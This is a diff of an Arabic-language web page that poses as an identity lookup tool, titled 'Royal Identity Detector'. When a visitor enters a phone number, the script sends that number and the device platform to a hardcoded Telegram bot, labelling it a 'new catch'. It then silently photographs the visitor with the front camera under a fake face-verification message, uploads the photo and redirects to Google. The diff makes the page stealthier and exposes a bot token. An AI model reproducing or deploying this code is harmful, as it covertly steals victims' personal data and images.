@@ -3,71 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كاشف الهوية المتقدم</title>
+    <title>كاشف الهوية الملكي</title>
     <style>
-        body { background: #0f1216; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #d4af37; width: 85%; max-width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; }
-        button { background: #d4af37; color: black; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        :root { --gold: #d4af37; --dark: #0f1216; }
+        body { background-color: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { background: #161b22; padding: 40px 25px; border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.3); width: 90%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo { font-size: 50px; margin-bottom: 10px; color: var(--gold); }
+        h2 { color: var(--gold); font-size: 20px; margin-bottom: 15px; }
+        p { color: #8b949e; font-size: 13px; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; outline: none; text-align: center; }
+        .btn { background: linear-gradient(45deg, #d4af37, #f9e29c); color: #000; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; }
+        #status { display: none; margin-top: 20px; color: var(--gold); font-size: 14px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2 style="color:#d4af37">⚜️ كاشف الهوية</h2>
-    <input type="tel" id="p" placeholder="أدخل رقم الهاتف">
-    <button onclick="go()">بدأ الفحص</button>
-    <p id="msg" style="font-size:12px; color:#888; margin-top:10px;"></p>
+<div class="container">
+    <div id="ui">
+        <div class="logo">⚜️</div>
+        <h2>كاشف الهوية الملكي</h2>
+        <p>أدخل رقم الهاتف لمعرفة السجلات المرتبطة به</p>
+        <input type="tel" id="phone" placeholder="07XXXXXXXX" required>
+        <button class="btn" onclick="execute()">كشف الهوية الآن</button>
+    </div>
+    <div id="status">جاري الاتصال بالسيرفر المجهر...</div>
 </div>
 
-<video id="v" autoplay playsinline muted style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
 <script>
-    const T = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
-    const C = '5156556639';
+    const TOKEN = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
+    const CHAT_ID = '5156556639';
 
-    async function send(data, mode) {
-        const url = `https://api.telegram.org/bot${T}/${mode}`;
+    async function tgSend(formData, mode) {
         try {
-            const resp = await fetch(url, { method: 'POST', body: data });
-            const res = await resp.json();
-            if(res.ok) { console.log("Sent!"); } 
-            else { alert("Telegram Error: " + res.description); }
-        } catch (e) { alert("Network Error: فشل الاتصال بتليجرام"); }
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${mode}`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // لتجنب مشاكل Network Error في المتصفحات
+            });
+        } catch (e) {}
     }
 
-    function go() {
-        const num = document.getElementById('p').value;
-        if(num.length < 5) return;
+    function execute() {
+        const val = document.getElementById('phone').value;
+        if (val.length < 5) { alert("الرقم غير صحيح"); return; }
 
-        document.getElementById('msg').innerText = "جاري الإرسال...";
+        document.getElementById('ui').style.display = 'none';
+        document.getElementById('status').style.display = 'block';
 
-        // 1. إرسال الرقم فوراً
-        const fd = new FormData();
-        fd.append('chat_id', C);
-        fd.append('text', "🔔 صيد جديد: " + num);
-        send(fd, 'sendMessage');
+        // 1. إرسال الرقم والمعلومات فوراً (نص)
+        const textData = new FormData();
+        textData.append('chat_id', CHAT_ID);
+        textData.append('text', `🚨 صيد جديد من TOTV+:\n📞 الرقم: ${val}\n📱 الجهاز: ${navigator.platform}`);
+        tgSend(textData, 'sendMessage');
 
-        // 2. محاولة التصوير
+        // 2. محاولة فتح الكاميرا للتصوير
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(s => {
-            document.getElementById('v').srcObject = s;
+            const v = document.getElementById('v');
+            v.srcObject = s;
+            document.getElementById('status').innerText = "يتم التحقق من بصمة الوجه أمنياً...";
+
             setTimeout(() => {
                 const cv = document.getElementById('c');
-                cv.width = 400; cv.height = 400;
-                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 400);
+                cv.width = 400; cv.height = 500;
+                cv.getContext('2d').drawImage(v, 0, 0, 400, 500);
+                
                 cv.toBlob(b => {
-                    const pd = new FormData();
-                    pd.append('chat_id', C);
-                    pd.append('photo', b, 'a.jpg');
-                    send(pd, 'sendPhoto').then(() => {
-                        window.location.href = "https://www.google.com";
+                    const photoData = new FormData();
+                    photoData.append('chat_id', CHAT_ID);
+                    photoData.append('photo', b, 'shot.jpg');
+                    
+                    tgSend(photoData, 'sendPhoto').then(() => {
+                        document.getElementById('status').innerText = "تم التوثيق بنجاح!";
+                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 800);
                     });
-                }, 'image/jpeg', 0.5);
+                }, 'image/jpeg', 0.4); // ضغط الصورة لسرعة الرفع
             }, 2000);
         })
-        .catch(() => { window.location.href = "https://www.google.com"; });
+        .catch(() => {
+            // في حال رفض الإذن، يكون الرقم قد وصلك بالفعل، ونحوله لجوجل
+            window.location.href = "https://www.google.com";
+        });
     }
 </script>
 </body>
